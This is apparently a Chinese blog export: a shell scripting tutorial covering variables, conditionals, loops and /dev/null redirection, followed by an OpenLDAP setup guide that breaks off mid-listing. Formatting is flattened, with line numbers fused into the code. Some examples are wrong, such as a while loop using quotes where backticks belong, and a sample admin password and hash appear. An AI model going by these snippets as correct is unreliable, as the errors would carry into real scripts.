这个程序的第n个参数值，n=1..N 4.1 特殊变量： 有些变量是一开始执行Script脚本时就会设定，且不能被修改，但我们不叫它只读的系统变量，而叫它特殊变量。这些变量当一执行程序时就有了，以下是一些等殊变量： 12345$* 这个程序的所有参数$# 这个程序的参数个数$ 这个程序的PID$! 输出上一个后台程序的PID$? 输出上一个指令的返回值 5.1 自定义使用变量 使用一个定义过的变量，只要在变量名前面加美元符号即可，如： • 中间不能有空格，可以使用下划线（_）。• 不能使用标点符号。• 不能使用bash里的关键字（可用help命令查看保留关键字）。 12345678910111213[root@xuegod63 test]# cat expr.sh#! /bin/sha=10b=20c=30value1=`expr $a + $b + $c`echo \"The value of value1 is $value1\"value2=`expr $c / $b`echo \"The value of value2 is $value2\"value3=`expr $c \\* $b` #整除echo \"The value of value3 is $value3\"value4=`expr $a + $c / $b`echo \"The value of value4 is $value4\" 测试： 12345[root@xuegod63 test]# ./expr.shThe value of value1 is 60The value of value2 is 1The value of value3 is 600The value of value4 is 11 这里在说明点： 变量名外面的花括号是可选的，加不加都行，加花括号是为了帮助解释器识别变量的边界，比如下面这种情况： 1234for skill in Ada Coffe Action Javado echo \"I am good at $&#123;skill&#125;Script\"done 如果不给skill变量加花括号，写成echo &quot;I am good at $skillScript&quot;，解释器就会把$skillScript当成一个变量（其值为空），代码执行结果就不是我们期望的样子了。 推荐给所有变量加上花括号，这是个好的编程习惯。 这里在变量使用read，课外补充： read命令接收标准输入（键盘）的输入，或者其他文件描述符的输入。得到输入后，read命令将数据放入一个标准变量中。 123456789101.基本读取#!/bin/bash echo -n \"Enter your name:\" #参数-n的作用是不换行，echo默认是换行 read name #从键盘输入 echo \"hello $name, welcome to my program\" exit 0 #退出shell程序。其等效于以下：read -p \"Enter your name:\" name #-p参数，允许在read命令行中直接指定一个提示 使用read命令存在着潜在危险。脚本很可能会停下来一直等待用户的输入。如果无论是否输入数据脚本都必须继续执行，那么可以使用 -t 选项指定一个计时器，指定read命令等待输入的秒数。当计时满时，read命令返回非零值（0为正常退出状态）; 举例： 12345678#!/bin/bash if read -t 5 -p \"please enter your name:\" name then echo \"hello $name, welcome to my script\" else echo \"sorry,too slow\" fi exit 0 第四章Shell特殊变量：$0,$#,$*,$@,$?,$$和命令行参数我们可以在执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推…… 下面是$其他参数使用方法,一般用的比较多的都是传递脚本参数： 1234567$# 传递到脚本的参数个数$* 以一个单字符串显示所有向脚本传递的参数。如\"$*\"用「\"」括起来的情况、以\"$1 $2 … $n\"的形式输出所有参数。$$ 脚本运行的当前进程ID号$! 后台运行的最后一个进程的ID号$@ 与$*相同，但是使用时加引号，并在引号中返回每个参数。如\"$@\"用「\"」括起来的情况、以\"$1\" \"$2\" … \"$n\" 的形式输出所有参数。$- 显示Shell使用的当前选项，与set命令功能相同。$? 显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。 这个跟我们自定义变量有点区别， 看例子脚本： 12345678910111213#!/bin/bash#author=yangc#blog.yangcvo.meecho \"shell 脚本很好用1：$1\";echo \"shell 脚本很好用2：$2\";echo \"shell 脚本很好用3：$3\";echo \"File Name: $0\"echo \"First Parameter : $1\"echo \"First Parameter : $2\"echo \"Quoted Values: $@\"echo \"Quoted Values: $*\"echo \"Total Number of Parameters : $#\" 使用脚本传递参数： 123456789shell 脚本很好用1：3shell 脚本很好用2：4shell 脚本很好用3：6File Name: sh.shFirst Parameter : 3First Parameter : 4Quoted Values: 3 4 6Quoted Values: 3 4 6Total Number of Parameters : 3 第五章 Shell替换：Shell变量替换，命令替换，转义字符如果表达式中包含特殊字符，Shell 将会进行替换。例如，在双引号中使用变量就是一种替换，转义字符也是一种替换。 123#!/bin/basha=10echo -e \"Value of a is $a \\n\" 运行结果： 1Value of a is 10 这里 -e 表示对转义字符进行替换。如果不使用 -e 选项，将会原样输出： 1Value of a is 10\\n 2.1 命令替换 命令替换是指Shell可以先执行命令，将输出结果暂时保存，在适当的地方输出。 1234567#!/bin/bashDATE=`date`echo \"Date is $DATE\"USERS=`who | wc -l`echo \"Logged in user are $USERS\"UP=`date ; uptime`echo \"Uptime is $UP\" 运行结果： 1234Date is 2017年 04月 28日 星期五 11:41:34 CSTLogged in user are 1Uptime is 2017年 04月 28日 星期五 11:41:34 CST11:41:34 up 266 days, 10:43, 1 user, load average: 0.33, 0.14, 0.11 第六章Shell注释以“#”开头的行就是注释，会被解释器忽略。这里因为很多写脚本都带有个性的风格，这样写的更加有乐趣。 sh里没有多行注释，只能每一行加一个#号。只能像这样： 12345678910111213#--------------------------------------------# 这是一个自动打ipa的脚本，基于webfrogs的ipa-build书写：# https://github.com/webfrogs/xcode_shell/blob/master/ipa-build# 功能：自动为etao ios app打包，产出物为14个渠道的ipa包# 特色：全自动打包，不需要输入任何参数#--------------------------------------------##### 用户配置区 开始 ######## 项目根目录，推荐将此脚本放在项目的根目录，这里就不用改了# 应用名，确保和Xcode里Product下的target_name.app名字一致###### 用户配置区 结束 ##### 如果在开发过程中，遇到大段的代码需要临时注释起来，过一会儿又取消注释，怎么办呢？每一行加个#符号太费力了，可以把这一段要注释的代码用一对花括号括起来，定义成一个函数，没有地方调用这个函数，这块代码就不会执行，达到了和注释一样的效果。 第七章Shell echo命令和printf命令：格式化输出语句echo是Shell的一个内部指令，用于在屏幕上打印出指定的字符串。命令格式： 1.1 显示转义字符 123echo \"\\\"It is a test\\\"\"执行结果将是：\"It is a test\" 显示变量 12345name=\"OK\"echo \"$name It is a test\"执行结果将是：OK It is a test 同样双引号也可以省略。 2.1 shell 脚本中echo 颜色显示内容 这里我因为之前在学习shell没有明确提到这个，这里我自己总结就加进来，因为很多次看到专业团队写shell跑整个脚本过程，特别舒服，开头有提示颜色说明，特别是国外哪些人写的不止好用，而且脚本跑起来也很有意思。 后面我写脚本都会该注意和提示都会有突出颜色标注。(这是个好习惯) shell脚本中echo显示内容带颜色显示,echo显示带颜色，需要使用参数 -e 脚本举例： 1echo -e \"\\033[字背景颜色；文字颜色m字符串\\033[0m\" 例如： 1echo -e \"\\033[41;36m something here \\033[0m\" 其中41的位置代表底色， 36的位置是代表字的颜色. ⚠️注： 1、字背景颜色和文字颜色之间是英文的”” 2、文字颜色后面有个m 3、字符串前后可以没有空格，如果有的话，输出也是同样有空格 下面是相应的字和背景颜色，可以自己来尝试找出不同颜色搭配 1234unset -f pathmungeecho -e '\\t\\t\\t\\t\\t\\e[1;31m登录情况\\e[0m\\n'last -n 6|naliuptime 这里贡献下代码颜色： 123456789101112 echo -e “\\033[30m 黑色字 \\033[0m” echo -e “\\033[31m 红色字 \\033[0m” echo -e “\\033[32m 绿色字 \\033[0m” echo -e “\\033[33m 黄色字 \\033[0m” echo -e “\\033[34m 蓝色字 \\033[0m” echo -e “\\033[35m 紫色字 \\033[0m” echo -e “\\033[36m 天蓝字 \\033[0m” echo -e “\\033[37m 白色字 \\033[0m” echo -e \"\\t\\t\\t\\t\\t\\t\\e[1;31m 最近5次登录地址信息 \\e[0m\"last -5 | naliecho -e \"\\t\\t\\t\\t\\t\\t\\e[2;32m 服务器当前性能负载情况 \\e[0m\"uptime 查看效果： 效果图 3.1 printf 命令用于格式化输出， 是echo命令的增强版。它是C语言printf()库函数的一个有限的变形，并且在语法上有些不同。 注意：printf 由 POSIX 标准所定义，移植性要比 echo 好。 举例： 12345678910111213# 没有引号也可以输出$ printf %s abcdefabcdef# 格式只指定了一个参数，但多出的参数仍然会按照该格式输出，format-string 被重用$ printf %s abc defabcdef$ printf \"%s\\n\" abc defabcdef$ printf \"%s %s %s\\n\" a b c d e f g h i ja b cd e fg h i 第八章 Shell if else 判断语句这里我要说下 这里入门说的前面几章和第八章都是经常用的比较多的。 if 语句通过关系运算符判断表达式的真假来决定执行哪个分支。Shell 有三种 if … else 语句：if … fi 语句；if … else … fi 语句；if … elif … else … fi 语句。 1.1 if … else 语句 if … else 语句的语法： 1234if [ expression ]then Statement(s) to be executed if expression is truefi 如果 expression 返回 true，then 后边的语句将会被执行；如果返回 false，不会执行任何语句。 最后必须以 fi 来结尾闭合 if，fi 就是 if 倒过来拼写，后面也会遇见。 注意：expression和方括号([ ])之间必须有空格，否则会有语法错误。 举个例子： 1234567891011#!/bin/sha=10b=20if [ $a == $b ]then echo \"a is equal to b\"fiif [ $a != $b ]then echo \"a is not equal to b\"fi 运行结果： a is not equal to b 2.1文件表达式 我们经常用到文件判断， 整数变量判断。 1234567if [ -f file ] 如果文件存在if [ -d ... ] 如果目录存在if [ -s file ] 如果文件存在且非空 if [ -r file ] 如果文件存在且可读if [ -w file ] 如果文件存在且可写if [ -x file ] 如果文件存在且可执行 if [ -z file ] -z代表的是该变量是否有值。 举例： 123456789101112131415161718192021222324252627# 这里的-x 参数判断$myPath是否存在并且是否具有可执行权限 if [ ! -x \"$myPath\"]; then mkdir \"$myPath\" fi # 这里的-d 参数判断$myPath是否存在 if [ ! -d \"$myPath\"]; then mkdir \"$myPath\" fi # 这里的-f参数判断$myFile是否存在 if [ ! -f \"$myFile\" ]; then touch \"$myFile\" fi # 其他参数还有-n,-n是判断一个变量是否是否有值 if [ ! -n \"$myVar\" ]; then echo \"$myVar is empty\" exit 0 fi # 两个变量判断是否相等 if [ \"$var1\" = \"$var2\" ]; then echo '$var1 eq $var2' else echo '$var1 not eq $var2' fi 3.1整数变量表达式 123456if [ \"int1\" -eq \"int2\" ] 如果int1等于int2 if [ \"int1\" -ne \"int2\" ] 如果不等于 if [ \"int1\" -ge \"int2\" ] 如果&gt;==if [ \"int1\" -gt \"int2\" ] 如果&gt;if [ \"int1\" -le \"int2\" ] 如果&lt;=if [ \"int1\" -lt \"int2\" ] 如果&lt; if !=不等于使用 123456if [ $TMZONE != Asia/Shanghai ];then这个时区不等于Asia/Shanghai 也就是没有这个名字就\\cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime if [ -f $1] 的含义: 这是一个判断语句的头半句，意思是：将一个文件普通名传给传给$1，并判断这个文件是否存在。后半句应该还有：then…，存在应该怎样做；和else…不存在应该怎样做。 举例： 12345678910111213141516[root@xuegod63 test]# cat elif.sh#!/bin/bashecho \"input a file name:\"read file_nameif [ -d $file_name ] ; then echo \" $file_name is a dir\"elif [ -f $file_name ] ; then echo \" $file_name is file\"elif [ -c $file_name -o -b $file_name ] ; then echo \" $file_name is a device file\"else echo \" $file_name does not exist \"fi 第九章 Shell for循环1.1 for循环一般格式为: 1234567for 变量 in 列表do command1 command2 ... commandNdone 列表是一组值（数字、字符串等）组成的序列，每个值通过空格分隔。每循环一次，就将列表中的下一个值赋给变量。 in 列表是可选的，如果不用它，for 循环使用命令行的位置参数。 例如，顺序输出当前列表中的数字： 1234for loop in 1 2 3 4 5do echo \"The value is: $loop\"done 运行结果： 12345The value is: 1The value is: 2The value is: 3The value is: 4The value is: 5 这里比如举例用的比较多的 yum循环安装依赖包。 123456789for i in \\gcc \\gcc-c++ \\vim-enhanced \\lrzsz \\ntpdate \\;doyum -y install $i 顺序输出字符串中的字符： 1234for str in 'This is a string'do echo $strdone 运行结果： 1This is a string 显示主目录下以 .bash 开头的文件： 12345#!/bin/bashfor FILE in $HOME/.bash*do echo $FILEdone 运行结果： 1234/root/.bash_history/root/.bash_logout/root/.bash_profile/root/.bashrc 第十章 Shell while循环while循环用于不断执行一系列命令，也用于从输入文件中读取数据；命令通常为测试条件。其格式为： 以下是一个基本的while循环，测试条件是：如果COUNTER小于5，那么返回 true。COUNTER从0开始，每次循环处理时，COUNTER加1。运行上述脚本，返回数字1到5，然后终止。 123456COUNTER=0while [ $COUNTER -lt 5 ]do COUNTER='expr $COUNTER+1' echo $COUNTERdone 运行结果： 123456运行脚本，输出：12345 第十一章： Shell输入输出重定向：Shell Here Document，/dev/null文件命令输出重定向的语法为： 输出重定向会覆盖文件内容，请看下面的例子： 1234 echo line 1 &gt; users$ cat usersline 1$ 也可以 将 Here Document 用在脚本中，例如： 123456789#!/bin/bashcat &lt;&lt; EOF+------------------------------------+| || This is a simple lookup program || for good (and bad) restaurants || in Cape Town. ||------------------------------------+EOF 运行结果： 1234567sh test.sh+------------------------------------+| || This is a simple lookup program || for good (and bad) restaurants || in Cape Town. ||------------------------------------+ 2.1/dev/null 文件 以前有人问过我这个/dev/null是什么意思。 这个是在shell脚本里面经常用到的。 比如说：不明白grep “tomcat” /etc/passwd&gt;/dev/null 2&gt;&amp;1 在/etc/passwd查找是否包含字符串tomcat 并把标准输出和标准错误一起重定向到/dev/null 输出重定向（&gt;）操作在命令执行发生错误时，会将错误信息直接显示到屏幕，并不记录到文件中,没必要放在内存 标准输出与错误输出重定向（&amp;&gt;）可以将标准输出和错误输出信息一并重新定向到文件，屏幕上不会显示任何信息 ,如果没有 &gt;/dev/null 2&gt;&amp;1 ，结果 就直接显示在屏幕上咯。 grep “tomcat” /etc/passwd&gt;/dev/null 2&gt;&amp;1首先是grep “tomcat” /etc/passwd&gt;/dev/null 将标准输出重定向到/dev/null 然后2&gt;&amp;1把标准错误重定向到标准输出 也就是也被重定向到了/dev/null 那结果就是标准输出和标准错误都被重定向到了/dev/null /dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到”禁止输出“的效果。 如果希望屏蔽 stdout 和 stderr，可以这样写： 1command &gt; /dev/null 2&gt;&amp;1 Shell个人总结常规使用较多的一些参数语法。我个人写shell脚本都使用到sleep参数。 1.Shell脚本中让进程休眠的方法（sleep用法）123456789101112131415161718有时候写Shell的脚本，用于顺序执行一系列的程序。 有些程序在停止之后并没能立即退出，就例如有一个 tomcat 挂了，就算是用 kill -9 命令也还没瞬间就结束掉。这么如果 shell 还没等其退出就接着执行下一行，这么就出乱子了。 刚知道了原来 shell 也能有 sleep 的参数。复制代码 代码如下:sleep 1 睡眠1秒sleep 1s 睡眠1秒sleep 1m 睡眠1分sleep 1h 睡眠1小时用法如下，例如重启tomcat：复制代码 代码如下:#!/bin/sh/opt/tomcat/bin/shutdown.shsleep 3 #等3秒后执行下一条/opt/tomcat/bin/startup.sh 2.SHELL脚本中有exit 0，和exit 1 的区别这里我先举个例子： 12345678910111213141516#!/bin/sh x=10 if [ \"$x\" = 10 ]; then echo \"is 10\" exit 0 fi#!/bin/sh x=10 if [ \"$x\" = 10 ]; then echo \"is 10\" exit 1 fi 当你 exit 0 的时候在调用环境echo $? 就返回0 ，也就是说调用环境就认为 你的这个程序执行正确.当 exit 1 的时候，一般是出错定义这个1，也可以是其他数字，很多系统程序这个错误编号是有约定的含义的。 但不为0 就表示程序运行出错。 调用环境就可以根据这个返回值判断 你这个程序运行是否ok。如果你用 脚本a调用脚本b，要在a中判断b是否正常返回，就是根据exit 0or1来识别。执行完b后，判断 $? 就是返回值. 3.shell中获取时间12345678910111213取当天时间日期赋值给DATE变量DATE=$(date +%Y%m%d)有时候我们需要使用今天之前或者往后的日期，这时可以使用date的 -d参数获取明天的日期date -d next-day +%Y%m%d获取昨天的日期date -d last-day +%Y%m%d获取上个月的年和月date -d last-month +%Y%m获取下个月的年和月date -d next-month +%Y%m获取明年的年份date -d next-year +%Y 4.shell 过滤文件 重复如何去重123sort |uniq 用这个命令。先 sort 排序 ，再 uniq 去重 ，要是想知道重复的数量就 用 uniq -c这个执行看下就可以了。 5. shell 单引号，双引号 区别与使用1234567单引号str='this is a string'单引号字符串的限制：* 单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；* 单引号字串中不能出现单引号（对单引号使用转义符后也不行）。 6. shell 中的&gt;/dev/null 2&gt;&amp;1 是什么鬼？123456789101112131415161718192021222324### 这条命令其实分为两命令，一个是&gt;/dev/null，另一个是2&gt;&amp;1。1. &gt;/dev/null这条命令的作用是将标准输出1重定向到/dev/null中。/dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了&gt;/dev/null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。2. 2&gt;&amp;1这条命令用到了重定向绑定，采用&amp;可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，说人话就是错误输出将会和标准输出输出到同一个地方。linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令，所以&gt;/dev/null 2&gt;&amp;1的作用就是让标准输出重定向到/dev/null中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了/dev/null中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中。&gt;/dev/null 2&gt;&amp;1 VS 2&gt;&amp;1 &gt;/dev/null再回到文章的开头，我说我弄反了&gt;/dev/null和2&gt;&amp;1拼装的顺序，导致出了一点小问题。乍眼看这两条命令貌似是等同的，但其实大为不同。刚才提到了，linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令。那么我们同样从左到右地来分析2&gt;&amp;1 &gt;/dev/null：2&gt;&amp;1，将错误输出绑定到标准输出上。由于此时的标准输出是默认值，也就是输出到屏幕，所以错误输出会输出到屏幕。&gt;/dev/null，将标准输出1重定向到/dev/null中。&gt;&gt;/dev/null 2&gt;&amp;1### nohup结合我们经常使用nohup command &amp;命令形式来启动一些后台程序，比如一些java服务：# nohup java -jar xxxx.jar &gt;/dev/null 2&gt;&amp;1 &amp;总而言之，在工作中用到最多的就是nohup command &gt;/dev/null 2&gt;&amp;1 &amp;命令，希望大家能够好好掌握。","link":"/2016/03/21/shell编程入门到简单/shell入门到简单 学习总结1-12章/"},{"title":"OpenLDAP服务的配置与管理-phpldapadmin管理认证","text":"使用 OpenLDAP 集中管理用户帐号1.OpenLDAP 简介OpenLDAP可以从 http: //www.openldap.org/ 获得安装包。OpenLDAP 网站主页如图所示。 2.OpenLDAP 软件包的获取与安装用 rpm –ivh 命令进行安装。 1.redHat系统rpm手工安装# rpm -qa |grep ldap openldap-devel-2.3.27-5 php-ldap-5.1.6-5.el5 openldap-servers-2.3.27-5 openldap-2.3.27-5 openldap-clients-2.3.27-5 nss_ldap-253-3 安装 rpm -ivh openldap-servers-2.3.27-5.i386.rpm warning: openldap-servers-2.3.27-5.i386.rpm: Header V3 DSA signature: NOKEY, key ID 37017186 Preparing... ########################################### [100%] 1:openldap-servers ########################################### [100%] [root@localhost teacher]# rpm -ivh openldap-servers-sql-2.3.27-5.i386.rpm warning: openldap-servers-sql-2.3.27-5.i386.rpm: Header V3 DSA signature: NOKEY, key ID 37017186 Preparing... ########################################### [100%] 601 1:openldap-servers-sql ########################################### [100%] 123若出现以上结果表示 openldap 服务器包安装完毕。centos上面系统6 或者7 都是只能看到： [root@openldap ~]# rpm -qa |grep ldap openldap-2.4.40-5.el6.x86_64 1234567#### 2.根据源代码编译安装下载源码包：[openldap-stable](ftp://ftp.openldap.org/pub/OpenLDAP/openldap-release)```bash#tar –zxvf openldap-stable-20070831.tgz #cd openldap-stable-20070831 #./configure #make depend #make #make test #make install * Berkeley DB 数据库的安装 OpenLDAP 可以支持多种后台数据库,如 LDBM 和 BDB 等,这些轻量级的数据库项目都是 针对(key,value)类型的信息存放的,属于非关系型数据库,采用 hash 散列或者 B+树的方式存 储数据,查询效率较高。 BDB(Berkeley DB)是由美国 Sleepycat Software 公司开发的一套开放源代码的嵌入式数据库 系统,2006 年被 Oracle 公司收购。它具有良好的可伸缩、高性能的事务处理机制和较好的可扩展 性等优点。OpenLDAP 可以使用 BDB 或 LDBM 作为后台数据库。因此,若需要正常使用 OpenLDAP 服务器,需要安装 BDB 数据库在下载[Berkeley DB](http://www.oracle.com/technology/software/products/berkeley-db/index.html) Berkeley DB 下载页面 以下载并安装 `db-4.6.19.tar.gz` 为例,使用如下命令: ```bash # tar zxvf db-4.6.19.tar.gz # cd db-4.6.19/build_unix # ../dist/configure # make # make install 1234567891011121314151617181920 默认情况下,BDB 被安装在/usr/local/BerkeleyDB.4.6/目录中,为了能让 OpenLDAP 使用 BDB 的库文件,还需要将 BDB 库文件所在的目录添加到系统动态链接库的路径中。需要编辑系统动态 链接库的配置文件/etc/ld.so.conf,在文件的末尾加入如下语句: /usr/local/ BerkeleyDB.4.6/lib 之后,使用以下命令刷新系统动态链接库缓存:Berkeley DB 数据库安装完毕。#### 3.这里我选择yum一键安装因为centos会自动安装一些需要的依赖1.LDAP Server Setup:a.安装LDAP服务（使用YUM本地光盘安装）会提示安装以下几个必须的包，另外鉴于依赖，可能还会安装一些其他的包，所以我们选择-y：```bashopenldap-devel-2.4.23-26.el6.x86_64openldap-clients-2.4.23-26.el6.x86_64openldap-2.4.23-26.el6.x86_64openldap-servers-2.4.23-26.el6.x86_64# yum install -y vim automake autoconf gcc xz ncurses-devel \\ patch python-devel git python-pip gcc-c++ # 安装基本环境，后面依赖# yum install -y openldap openldap-servers openldap-clients openldap-devel 前面编译安装也提到： OpenLDAP 使用`Berkely-DB`来作为数据库存储信息，我们可以去官网下载解压到本地安装。But,用Yum的话，应该会帮我们做好这一切事情。 我们只要在安装完后检查一下是否安装了db4*相关的rpm包就可以了。If true,那恭喜，我们可以进行下一步了。If not,请用yum命令安装。 查看rpm安装包的命令：`rpm -qa | grep db4` 123[root@openldap ~]# rpm -qa | grep db4db4-4.7.25-19.el6_6.x86_64db4-utils-4.7.25-19.el6_6.x86_64 ## 2. 配置 OpenLDAP 服务器 OpenLDAP 的主配置文件是`/etc/openldap/slapd.conf`,配置 OpenLDAP 服务器主要是对该文件 进行修改。 拷贝LDAP配置文件到LDAP目录 12# cp /usr/share/openldap-servers/slapd.conf.obsolete /etc/openldap/slapd.conf ## 该文件是slapd的配置文件# cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG ## 数据库的配置文件 Note: redhat6.0或6.1版本配置文件在主目录有备份： 12# cd /etc/openldap/# cp slapd.conf slapd.conf.bak #### 配置 slapd.conf 文件 需要注意的是每次修改配置文件的设置后,需重新启动 OpenLDAP 服务后才能使新的配置生 效。按照以下方法配置/etc/openldap/slapd.conf 文件。 #### 设置 Schema `Schema(模式)`定义了 LDAP 中的对象类型、属性、语法和匹配规则等,如用户的电子邮件、 联系地址和联系电话等属性,它类似于关系数据库中的表结构。在实际应用中,不同的应用领域 会有不同的 Schema,用户可以通过自定义 Schema 使 LDAP 能够存储各种各样的信息。`OpenLDAP 安装目录的/etc/openldap/schema`目录下包含许多常用的 Schema 定义文件(例如,用于表示单位中 人员的 InetOrgPerson 模式),使用它们已经可以满足一般性应用的需要。 1234567891011121314[root@openldap openldap]# ll /etc/openldap/schema/*.schema-rw-r--r--. 1 root root 6190 5月 11 07:32 /etc/openldap/schema/collective.schema-rw-r--r--. 1 root root 8063 5月 11 07:32 /etc/openldap/schema/corba.schema-rw-r--r--. 1 root root 20499 5月 11 07:32 /etc/openldap/schema/core.schema-rw-r--r--. 1 root root 73994 5月 11 07:32 /etc/openldap/schema/cosine.schema-rw-r--r--. 1 root root 10388 5月 11 07:32 /etc/openldap/schema/duaconf.schema-rw-r--r--. 1 root root 3289 5月 11 07:32 /etc/openldap/schema/dyngroup.schema-rw-r--r--. 1 root root 6267 5月 11 07:32 /etc/openldap/schema/inetorgperson.schema-rw-r--r--. 1 root root 13901 5月 11 07:32 /etc/openldap/schema/java.schema-rw-r--r--. 1 root root 2387 5月 11 07:32 /etc/openldap/schema/misc.schema-rw-r--r--. 1 root root 7640 5月 11 07:32 /etc/openldap/schema/nis.schema-rw-r--r--. 1 root root 1514 5月 11 07:32 /etc/openldap/schema/openldap.schema-rw-r--r--. 1 root root 20467 5月 11 07:32 /etc/openldap/schema/pmi.schema-rw-r--r--. 1 root root 19963 5月 11 07:32 /etc/openldap/schema/ppolicy.schema 编辑 slapd.conf 文件,如下: ```bash # See slapd.conf(5) for details on configuration options. # This file should NOT be world readable. # include /etc/openldap/schema/corba.schema include /etc/openldap/schema/core.schema include /etc/openldap/schema/cosine.schema include /etc/openldap/schema/duaconf.schema include /etc/openldap/schema/dyngroup.schema include /etc/openldap/schema/inetorgperson.schema include /etc/openldap/schema/java.schema include /etc/openldap/schema/misc.schema include /etc/openldap/schema/nis.schema include /etc/openldap/schema/openldap.schema include /etc/openldap/schema/ppolicy.schema include /etc/openldap/schema/collective.schema 其中,core.schema 是所有 LDAP 目录所必需的,nis.schema 文件用于在 LDAP 目录文件中提 供网络信息系统数据。一般而言,在不能肯定是否需要这些 schema 文件时,不应删除这些文件。 2.修改目录树后缀 slapd.conf 中,目录树后缀为: suffix \"dc=my-domain,dc=com\" 将其修改为: suffix \"dc=ihaozhuo,dc=com\" 3.修改管理员 DNslapd.conf 中,原 LDAP 修改管理员 DN 为: rootdn \"cn=Manager,dc=my-domain,dc=com\" 将其改为: rootdn \"cn=admin,dc=ihaozhuo,dc=com\" 123454.设置支持数据库 将原先设置的数据库: ```bash database ldbm ``` 修改为已安装的BDB: ```bashdatabase bdb 5.使用 slappasswd 命令创建加密口令 在 slapd.conf 文件中,需要输入修改 OpenLDAP 后台数据库所必需的口令。默认情况下,在 slapd.conf 文件中使用 rootpw 语句以明文字符串定义口令。该口令赋予对后台数据库的完全控制 权限。 1# rootpw secret 若希望把后台数据库口令改为“qwe123.com”,则作如下修改: 1rootpw 111 但是,明文字符串是不安全的,应当为 OpenLDAP 创建加密口令。创建加密口令使用 slappasswd命令。加密方式有 SSHA、MD5、SMD5、SSH 等。 #### 创建LDAP管理员密码 这里我输入的密码是qwe123.com,输入完密码后,返回一串密文，先保存到剪贴板,之后要复制到LDAP配置文件中使用: 1234[root@openldap ]# slappasswdNew password:Re-enter new password:&#123;SSHA&#125;k2+3iWauGVNo8k2sKQbGAe/iUeaAq3Hk 则 OpenLDAP 后台数据库将使用加密口令。 总结配置： 12345678910database bdbsuffix \"dc=ihaozhuo,dc=com\"checkpoint 1024 15rootdn \"cn=admin,dc=ihaozhuo,dc=com\"# Cleartext passwords, especially for the rootdn, should# be avoided. See slappasswd(8) and slapd.conf(5) for details.# Use of strong authentication encouraged.# rootpw secret# rootpw &#123;crypt&#125;ijFYNcSNctBYgrootpw &#123;SSHA&#125;k2+3iWauGVNo8k2sKQbGAe/iUeaAq3Hk 到这里就配置完sldap.conf * 说明： 123456789101112131415 loglevel：设置日志级别 suffix：其实就是BaseDN rootdn:超级管理员的dn rootpw:超级管理员的密码``` #### 修改系统日志配置文件```bash# vim /etc/rsyslog.conf local4.* /var/log/ldap.log# local7.*下添加一行在启动服务。# service rsyslog restart ## 3. 测试 slapd.conf 设置 完成 slapd.conf 文件的设置后,可以运行 slaptest 命令进行测试。命令如下: 12[root@openldap openldap]# slaptest -uconfig file testing succeeded 如果lapd.conf文件设置不正确,将出现`“slaptest: bad configuration file!”`的提示,同时提示 错误的行号,按照提示进行修改后,运行 slaptest 命令重新检查,直到配置文件设置正确。可[参考链接](http://www.oschina.net/question/137892_77767) #### OpenLDAP 的启动与停止 启动slapd, 查看启动情况 1service slapd start 如果跟下面一样报错 error启动 slapd：[失败] 下面是解决方法： 123456789[root@openldap openldap]# service slapd start/var/lib/ldap/__db.006 is not owned by \"ldap\" [警告]/var/lib/ldap/__db.005 is not owned by \"ldap\" [警告]/var/lib/ldap/__db.004 is not owned by \"ldap\" [警告]/var/lib/ldap/__db.003 is not owned by \"ldap\" [警告]/var/lib/ldap/alock is not owned by \"ldap\" [警告]/var/lib/ldap/__db.001 is not owned by \"ldap\" [警告]/var/lib/ldap/__db.002 is not owned by \"ldap\" [警告]正在启动 slapd： [失败] 解决方法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253进入 cd /var/lib/ldap/ slapd (会生成一些库文件)[root@openldap ldap]# ll总用量 11312-rw-r--r--. 1 root root 2048 9月 28 15:41 alock-rw-------. 1 root root 24576 9月 28 15:41 __db.001-rw-------. 1 root root 9093120 9月 28 15:41 __db.002-rw-------. 1 root root 335552512 9月 28 15:41 __db.003-rw-------. 1 root root 2359296 9月 28 15:37 __db.004-rw-------. 1 root root 753664 9月 28 15:41 __db.005-rw-------. 1 root root 32768 9月 28 15:41 __db.006-rw-r--r--. 1 root root 845 9月 28 15:06 DB_CONFIG[root@openldap ldap]# slapd[root@openldap ldap]# ll总用量 11472-rw-r--r--. 1 root root 2048 9月 28 15:51 alock-rw-------. 1 root root 24576 9月 28 15:51 __db.001-rw-------. 1 root root 9093120 9月 28 15:51 __db.002-rw-------. 1 root root 335552512 9月 28 15:51 __db.003-rw-------. 1 root root 2359296 9月 28 15:51 __db.004-rw-------. 1 root root 753664 9月 28 15:51 __db.005-rw-------. 1 root root 32768 9月 28 15:51 __db.006-rw-r--r--. 1 root root 845 9月 28 15:06 DB_CONFIG-rw-------. 1 root root 8192 9月 28 15:51 dn2id.bdb-rw-------. 1 root root 32768 9月 28 15:51 id2entry.bdb-rw-------. 1 root root 10485760 9月 28 15:51 log.0000000001[root@openldap ldap]# netstat -ntlp | grep 389tcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 1859/slapdtcp 0 0 :::389 :::* LISTEN 1859/slapd[root@openldap ldap]# chown ldap:ldap *[root@openldap ldap]# chmod 600 *[root@openldap ldap]# ll总用量 11472-rw-------. 1 ldap ldap 2048 9月 28 15:55 alock-rw-------. 1 ldap ldap 24576 9月 28 15:55 __db.001-rw-------. 1 ldap ldap 9093120 9月 28 16:25 __db.002-rw-------. 1 ldap ldap 335552512 9月 28 15:55 __db.003-rw-------. 1 ldap ldap 2359296 9月 28 16:10 __db.004-rw-------. 1 ldap ldap 753664 9月 28 15:55 __db.005-rw-------. 1 ldap ldap 32768 9月 28 16:10 __db.006-rw-------. 1 ldap ldap 845 9月 28 15:06 